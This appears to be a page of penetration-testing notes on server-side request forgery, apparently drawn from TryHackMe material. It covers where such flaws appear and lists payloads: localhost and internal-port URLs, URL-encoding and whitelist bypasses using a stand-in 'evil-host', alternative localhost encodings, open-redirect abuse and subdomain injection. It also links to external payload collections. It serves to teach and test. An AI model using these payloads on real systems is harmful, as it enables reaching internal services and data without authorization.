# SSRF

## Server Side Request Forgery (SSRF)

In a server-side request forgery (SSRF) attack, the attacker can abuse server functionality to read or update internal resources. The attacker can provide or modify a URL to which code running on the server will read or send data, and by carefully selecting URLs, the attacker can read server configuration such as AWS metadata, connect to internal services such as http enabled, databases, or make publish requests towards internal services that are not intended to be exposed.

### Types of SSRF (detection)

Potential SSRF vulnerabilities can be detected in web applications in many different ways. Here is an example of common places to look:

![When a full URL is used in an address bar parameter.](../../.gitbook/assets/ssrf\_1.png)

![A hidden field in a form.](../../.gitbook/assets/ssrf\_2.png)

![A partial URL such as, for example, just the host name.](../../.gitbook/assets/ssrf\_3.png)

![Only the path of the URL.](../../.gitbook/assets/ssrf\_4.png)

![Only the URL path in the source code.](../../.gitbook/assets/ssrf\_5.png)

### Payloads (with bypass defenses)

```bash
# Payloads:
http://localhost/admin
http://127.0.0.1:80
http://localhost:22
# Bypass:
http://127.1/%2561dmin # Hide "admin" with URL encode.
%2561 = %61 = a # Double URL encode to the letter "a" of admin.
# SSRF with whitelist-based input filters:
https://expected-host@evil-host/ # Number 1
https://evil-host#expected-host # Number 2
https://evil-host%25%32%33@expected-host/admin # Number 3
# Number 4. You can take advantage of the DNS name hierarchy to
# place the required entry in a fully qualified DNS name that you control:
https://expected-host -> https://expected-host.evil-host
http://holo.live -> http://holo.live.localtest.me/
```

### Alternative localhost

```bash
127.0.0.1
127.1
0.0.0.0
0
0000
127.*.*.*
2130706433
0177.1
017700000001
0x7f.1
127.0.0.1.nip.io # DNS record resolving to 127.0.0.1
localtest.me # DNS record resolving to 127.0.0.1
```

### Open redirection

If the above evasions do not work, there is one more trick up the attacker's sleeve, the open redirect. An open redirect is an endpoint on the server where the website visitor is automatically redirected to another website address. Take, for example, the link `https://website.thm/link?url=https://tryhackme.com`. This endpoint was created to record the number of times visitors have clicked on this link for advertising/marketing purposes. But imagine if there was a potential SSRF vulnerability with strict rules that only allowed URLs starting with https://website.thm/. An attacker could use the above function to redirect the internal HTTP request to a domain of their choice.

### SSRF via injection

We have the ability through the server parameter, to choose the subdomain to use:

```bash
https://website.com/item/3?server=api -> https://api.website.com/api/item?id=3
```

That is, we can overwrite the following part of the URL:

```bash
https://<INJECT>.website.com/...
```

In this case, we can abuse this to search for something else of value:

```bash
https://website.com/item/3?server=dev.website.com/user?id=9&x=
```

The **x=** is used to comment/ignore the remaining domain (**.website.com**). So the URL would look like this:

```bash
https://dev.website.com/user?id=9&x=.website.com/api/item?id=2
```

### More payloads

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" %}

{% embed url="https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/ssrf#attacking-aws-with-ssrf" %}
